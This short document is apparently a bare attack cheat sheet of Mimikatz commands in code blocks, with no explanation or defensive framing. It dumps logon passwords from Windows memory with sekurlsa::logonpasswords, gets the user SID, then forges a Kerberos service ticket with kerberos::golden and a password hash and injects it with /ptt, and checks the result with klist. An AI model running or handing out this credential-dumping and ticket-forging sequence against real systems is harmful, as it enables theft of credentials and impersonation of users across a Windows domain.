```powershell
privilege::debug
sekurlsa::logonpasswords
```

```powershell
whoami /user
kerberos::golden /sid:$SID /domain:$DOMAIN /ptt /target:$TARGET /service:http /rc4:$HASH /user:$TARGET_USER
```

```powershell
klist
```